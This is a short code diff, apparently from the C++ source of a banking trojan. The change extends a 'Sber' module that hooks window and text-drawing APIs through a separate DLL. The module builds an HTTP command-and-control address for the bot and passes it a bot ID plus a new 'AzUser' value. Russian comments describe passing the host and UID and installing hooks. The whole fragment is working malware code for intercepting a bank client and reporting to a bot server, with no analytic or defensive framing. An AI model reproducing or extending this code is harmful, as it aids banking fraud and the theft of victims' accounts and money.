@@ -28,6 +28,7 @@
 #include "CabPacker.h"
 #include "Loader.h"
 #include "BotHTTP.h"
+#include "AzConfig.h"
 
 #include "BotDebug.h"
 
@@ -47,7 +48,7 @@ namespace Sber
 
 // Импорт из Sb.dll
 typedef BOOL( WINAPI *PInitFunc )		(DWORD origFunc, char *funcName);
-typedef VOID( WINAPI *PSetParams )		(char *AHost, char *AUid);
+typedef VOID( WINAPI *PSetParams )		(char* AHost, char* AUid, char* AUser);
 typedef BOOL( WINAPI *PShowWindow )		( HWND hWnd, int nCmdShow );
 typedef BOOL( WINAPI *PTranslateMessage )( const MSG *lpMsg );
 typedef BOOL( WINAPI *PTextOutA )		(HDC hdc, int x, int y, LPCSTR lpString, int c);
@@ -299,7 +300,8 @@ static bool HookSberApi()
 	const char http[] = {'h','t','t','p',':','/','/', 0};
 	m_lstrcpy( HostOfBots, http );
 	m_lstrcat( HostOfBots, domain );
-	SetParamsSBR( HostOfBots, BOT_UID );
+	string azUser = GetAzUser();
+	SetParamsSBR( HostOfBots, BOT_UID, azUser.t_str() );
 	DBG( "Sber", "передаем хост %s и UID %s", HostOfBots, BOT_UID );
 
 	//Подгружаем из длл хуки и устанавливаем
